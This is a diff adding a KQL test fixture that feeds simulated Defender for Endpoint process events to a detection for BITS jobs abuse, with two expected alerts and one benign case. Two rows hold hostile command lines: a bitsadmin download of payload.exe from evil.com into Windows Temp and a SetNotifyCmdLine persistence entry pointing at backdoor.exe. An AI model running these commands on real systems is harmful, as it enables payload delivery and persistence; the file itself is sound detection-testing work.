@@ -1,0 +1,32 @@
+// === Test Case: BITS Jobs Abuse ===
+// Simulates: bitsadmin download from external URL to Temp (malicious) +
+// bitsadmin SetNotifyCmdLine persistence (high) + a benign bitsadmin /list
+// that should NOT fire (no suspicious context).
+// Expected: 2 high-severity alerts.
+// Query expects: DeviceProcessEvents (Microsoft Defender for Endpoint)
+
+let TestDeviceProcessEvents = datatable(
+    TimeGenerated: datetime,
+    FileName: string,
+    ProcessCommandLine: string,
+    AccountName: string,
+    InitiatingProcessFileName: string,
+    InitiatingProcessCommandLine: string,
+    DeviceName: string
+)
+[
+    // Malicious: bitsadmin downloading payload from external URL to Temp
+    datetime(2025-07-26 15:00:00), "bitsadmin.exe",
+    "bitsadmin.exe /transfer job1 /download /priority high http://evil.com/payload.exe C:\\Windows\\Temp\\payload.exe",
+    "jsmith", "cmd.exe", "cmd.exe /c bitsadmin", "WS-001",
+    // Malicious: SetNotifyCmdLine persistence
+    datetime(2025-07-26 15:05:00), "bitsadmin.exe",
+    "bitsadmin.exe /SetNotifyCmdLine job2 C:\\Users\\Public\\backdoor.exe NULL",
+    "akim", "powershell.exe", "powershell.exe", "WS-002",
+    // Benign: bitsadmin listing jobs (should NOT fire — no URL/path/notify)
+    datetime(2025-07-26 16:00:00), "bitsadmin.exe",
+    "bitsadmin.exe /list /allusers",
+    "admin", "cmd.exe", "cmd.exe", "WS-003",
+];
+
+TestDeviceProcessEvents
